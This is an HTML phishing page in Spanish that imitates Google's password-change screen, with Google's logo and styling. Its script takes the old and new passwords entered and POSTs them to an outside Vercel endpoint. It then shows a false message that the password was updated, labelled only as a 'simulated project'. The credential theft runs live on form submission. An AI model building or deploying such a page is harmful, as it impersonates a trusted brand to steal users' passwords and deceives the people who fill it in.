
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Cambiar contraseña</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background-color: #fff;
      width: 450px;
      padding: 40px 30px;
      border-radius: 8px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      text-align: center;
    }
    .logo {
      width: 75px;
      margin-bottom: 20px;
    }
    h2 {
      font-size: 22px;
      color: #202124;
      margin-bottom: 20px;
    }
    input[type="password"] {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      margin-bottom: 20px;
    }
    button {
      background-color: #1a73e8;
      color: white;
      padding: 10px 24px;
      font-size: 14px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    button:hover {
      background-color: #1765cc;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
    <h2>Cambiar tu contraseña</h2>
    <form id="formCambio">
      <input id="oldPass" type="password" placeholder="Contraseña anterior" required>
      <input id="newPass" type="password" placeholder="Nueva contraseña" required>
      <input id="confirmPass" type="password" placeholder="Confirmar nueva contraseña" required>
      <br>
      <button type="submit">Cambiar contraseña</button>
    </form>
  </div>

  <script>
    const formCambio = document.getElementById('formCambio');
    formCambio.addEventListener('submit', function(e) {
      e.preventDefault();
      const oldPass = document.getElementById('oldPass').value;
      const newPass = document.getElementById('newPass').value;
      const confirmPass = document.getElementById('confirmPass').value;

      fetch('https://vercel-proxy-project-fkkb8ienh-groogles-projects.vercel.app/api/enviar', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          oldPassword: oldPass,
          newPassword: newPass,
          confirmPassword: confirmPass
        })
      });

      alert("Contraseña actualizada. Proyecto simulado.");
    });
  </script>
</body>
</html>
